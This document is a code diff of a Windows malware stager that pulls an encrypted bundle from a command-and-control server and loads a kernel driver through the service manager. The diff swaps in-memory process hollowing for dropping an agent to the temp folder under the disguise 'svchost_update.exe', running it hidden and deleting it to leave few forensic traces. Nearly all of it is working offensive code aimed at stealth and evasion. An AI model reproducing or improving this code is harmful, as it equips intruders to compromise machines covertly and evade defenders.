@@ -1,7 +1,8 @@
 // stager.cpp
 // Fetches AES-encrypted bundle from C2, loads driver kernel-side,
-// hollows dllhost with payload in memory. Driver is the only thing
-// that touches disk — for ~10ms while SCM maps it into the kernel.
+// drops jocky_agent.exe briefly to disk and launches it, then deletes it.
+// Driver touches disk for ~10ms while SCM maps it; agent file for ~100ms
+// while the Windows loader maps it into its own process — then deleted.
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <winsock2.h>
@@ -25,10 +26,6 @@
 #define AES_KEY_HEX "6a6f636b795f6465765f6165735f6b65795f6a6f636b795f6465765f6165736b"
 #endif
 
-// Forward declarations — linked from client.cpp and hollow.cpp
-int   RunClientPipeline();
-DWORD RunHollowPipelineFromBuffer(LPBYTE buf, DWORD size);
-
 // ── Bundle format ────────────────────────────────────────────────────
 // [BundleHeader 16B][FileEntry × num_files][file data...]
 // Entire thing: base64( AES-256-CBC( IV[16] || plaintext ) )
@@ -43,14 +40,14 @@ struct BundleHeader {
     uint8_t reserved[10];
 };
 struct BundleEntry {
-    uint8_t  file_type;   // TYPE_DRIVER=0x01  TYPE_PAYLOAD=0x03
+    uint8_t  file_type;   // TYPE_DRIVER=0x01  TYPE_AGENT=0x04
     uint32_t size;
     uint64_t offset;      // absolute offset into plaintext bundle
 };
 #pragma pack(pop)
 
-#define TYPE_DRIVER  0x01
-#define TYPE_PAYLOAD 0x03
+#define TYPE_DRIVER 0x01
+#define TYPE_AGENT  0x04
 
 static uint8_t g_aesKey[32] = {};
 
@@ -229,29 +226,54 @@ int main() {
     BundleEntry* table = reinterpret_cast<BundleEntry*>(
         plain.data() + sizeof(BundleHeader));
 
-    uint8_t* driverBuf  = nullptr; uint32_t driverSize  = 0;
-    uint8_t* payloadBuf = nullptr; uint32_t payloadSize = 0;
+    uint8_t* driverBuf = nullptr; uint32_t driverSize = 0;
+    uint8_t* agentBuf  = nullptr; uint32_t agentSize  = 0;
 
     for (uint8_t i = 0; i < hdr->num_files; i++) {
         if (table[i].offset + table[i].size > plain.size()) return 1; // bounds check
         if (table[i].file_type == TYPE_DRIVER) {
             driverBuf  = plain.data() + table[i].offset;
             driverSize = table[i].size;
-        } else if (table[i].file_type == TYPE_PAYLOAD) {
-            payloadBuf  = plain.data() + table[i].offset;
-            payloadSize = table[i].size;
+        } else if (table[i].file_type == TYPE_AGENT) {
+            agentBuf  = plain.data() + table[i].offset;
+            agentSize = table[i].size;
         }
     }
 
-    if (!driverBuf || !payloadBuf) return 1;
+    if (!driverBuf || !agentBuf) return 1;
 
     // 6. Load driver — write, SCM start, delete immediately after StartService
     if (!LoadDriver(driverBuf, driverSize))
         return 1;
 
-    // 7. Hollow dllhost with in-memory payload — never written to disk
-    RunHollowPipelineFromBuffer(payloadBuf, payloadSize);
+    // 7. Write agent to %TEMP%, launch it, delete the file.
+    //    The Windows loader maps the image into the new process before we delete —
+    //    ~100ms is more than enough, but we wait for the process handle to be valid.
+    char tempDir[MAX_PATH], agentPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempDir);
+    snprintf(agentPath, MAX_PATH, "%ssvchost_update.exe", tempDir);
 
-    // 8. Run BYOVD client — compiled in, never on disk
-    return RunClientPipeline();
+    HANDLE hf = CreateFileA(agentPath, GENERIC_WRITE, 0, NULL,
+                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hf == INVALID_HANDLE_VALUE) return 1;
+    DWORD written = 0;
+    WriteFile(hf, agentBuf, agentSize, &written, NULL);
+    CloseHandle(hf);
+    if (written != agentSize) { DeleteFileA(agentPath); return 1; }
+
+    STARTUPINFOA si = {0}; si.cb = sizeof(si);
+    PROCESS_INFORMATION pi = {0};
+    if (!CreateProcessA(agentPath, NULL, NULL, NULL, FALSE,
+                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        DeleteFileA(agentPath);
+        return 1;
+    }
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+
+    // Give the loader time to map the image (~100ms headroom).
+    Sleep(150);
+    DeleteFileA(agentPath);
+
+    return 0;
 }
